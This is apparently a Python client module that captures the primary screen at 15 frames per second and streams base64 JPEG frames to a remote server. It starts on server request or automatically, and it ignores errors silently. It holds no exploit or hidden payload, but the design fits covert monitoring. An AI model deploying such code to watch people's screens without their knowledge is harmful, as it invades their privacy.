# Simple Stream handler for real-time screen streaming (NO HANG VERSION)

import subprocess
import threading
import logging
import time
import base64
import platform
import sys
import os
import mss
from PIL import Image
import io
import traceback

# Add src to path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from core.config import Config

class StreamHandler:
    def __init__(self, api_client):
        self.api_client = api_client
        self.is_streaming = False
        self.video_streaming = False
        self.stream_quality = 'medium'
        self.sequence = 0
        self.video_thread = None
        self.chunks_sent = 0

        # Enhanced logging
        self.logger = logging.getLogger(f"SimpleStreamHandler-{Config.CLIENT_ID}")
        
        self.logger.info("=== SIMPLE STREAM HANDLER INITIALIZED ===")

    def start_streaming(self):
        """
        SUPER SIMPLE streaming loop - AUTO START based on config
        """
        self.logger.info("=== SUPER SIMPLE STREAM HANDLER START ===")
        
        # Check if auto-start is enabled
        auto_start = getattr(Config, 'AUTO_START_VIDEO_STREAMING', False)
        if auto_start:
            self.logger.info("AUTO-START enabled - streaming will begin automatically")
            self.is_streaming = True
            self.video_streaming = True
            self._start_simple_worker()
        else:
            self.logger.info("Waiting for manual server requests...")

        # Super simple main loop
        loop_count = 0
        while True:
            try:
                loop_count += 1
                
                if loop_count % 20 == 0:  # Log less frequently
                    self.logger.info(f"Super simple loop #{loop_count} - streaming: {self.is_streaming}")
                
                # Simple server check only
                try:
                    response = self.api_client.get(f"/api/stream/request/{Config.CLIENT_ID}")
                    if response and response.get('quality') and not self.is_streaming:
                        self.logger.info("Manual start requested from server")
                        self.is_streaming = True
                        self.video_streaming = True
                        self._start_simple_worker()
                    elif self.is_streaming and not response:
                        self.logger.info("Stop requested from server")
                        self._stop_simple_worker()
                except Exception as e:
                    # Just ignore errors silently
                    pass
                
                time.sleep(15)  # Longer interval - 15 seconds
                
            except KeyboardInterrupt:
                self.logger.info("Interrupted by user")
                break
            except Exception as e:
                self.logger.error(f"Main loop error: {e}")
                time.sleep(20)

    def _start_simple_worker(self):
        """Start ONLY MSS worker - no FFmpeg complexity"""
        if self.video_thread and self.video_thread.is_alive():
            self.logger.info("Worker already running")
            return
            
        self.logger.info("Starting SIMPLE MSS worker thread")
        self.video_thread = threading.Thread(
            target=self._simple_mss_worker, 
            daemon=True,
            name=f"SimpleMSS-{Config.CLIENT_ID}"
        )
        self.video_thread.start()

    def _stop_simple_worker(self):
        """Stop worker"""
        self.is_streaming = False
        self.video_streaming = False
        self.logger.info("Simple worker stopped")

    def _simple_mss_worker(self):
        """SIMPLE MSS worker - just capture and send, no complexity"""
        self.logger.info("=== SIMPLE MSS WORKER STARTING ===")
        
        try:
            frame_interval = 1.0 / 15  # 15 FPS
            
            with mss.mss() as sct:
                monitor = sct.monitors[1]  # Primary monitor
                frame_count = 0
                
                while self.video_streaming:
                    try:
                        frame_start = time.time()
                        
                        # Simple screen capture
                        img = sct.grab(monitor)
                        img_pil = Image.frombytes('RGB', img.size, img.bgra, 'raw', 'BGRX')
                        
                        # Simple resize to 1280x720
                        img_pil = img_pil.resize((1280, 720), Image.Resampling.LANCZOS)

                        # Convert to JPEG
                        buffer = io.BytesIO()
                        img_pil.save(buffer, format='JPEG', quality=70)
                        
                        # Send chunk
                        self._simple_send_chunk(buffer.getvalue())
                        frame_count += 1
                        
                        # Simple logging every 100 frames
                        if frame_count % 100 == 0:
                            self.logger.info(f"Simple MSS: {frame_count} frames processed")
                        
                        # Simple frame rate control
                        elapsed = time.time() - frame_start
                        sleep_time = max(0, frame_interval - elapsed)
                        if sleep_time > 0:
                            time.sleep(sleep_time)
                        
                    except Exception as frame_error:
                        self.logger.error(f"Simple MSS frame error: {frame_error}")
                        time.sleep(0.5)  # Pause on error
                        
        except Exception as e:
            self.logger.error(f"Simple MSS worker failed: {e}")
        finally:
            self.video_streaming = False
            self.logger.info("Simple MSS worker finished")

    def _simple_send_chunk(self, chunk_data):
        """Send video chunk - SIMPLE version with no hanging"""
        try:
            encoded_chunk = base64.b64encode(chunk_data).decode('utf-8')
            
            payload = {
                'chunk': encoded_chunk,
                'sequence': self.sequence,
                'quality': 'medium',
            }
            
            self.sequence += 1
            self.chunks_sent += 1
            
            # Simple send with timeout (no waiting for response)
            try:
                self.api_client.post(f"/api/stream/chunk/{Config.CLIENT_ID}", payload)
                
                if self.chunks_sent % 50 == 0:
                    self.logger.info(f"Simple chunks sent: {self.chunks_sent}")
                    
            except Exception as network_error:
                # Ignore network errors to prevent hanging
                if self.chunks_sent % 20 == 0:
                    self.logger.debug(f"Simple network error: {network_error}")
            
        except Exception as e:
            self.logger.error(f"Simple chunk error: {e}")

    # Legacy compatibility methods
    def start_video_streaming(self):
        self._start_simple_worker()

    def stop_video_streaming(self):
        self._stop_simple_worker()

    def send_video_chunk(self, chunk_data):
        self._simple_send_chunk(chunk_data)

    def send_stream_chunk(self, img_data):
        self._simple_send_chunk(img_data)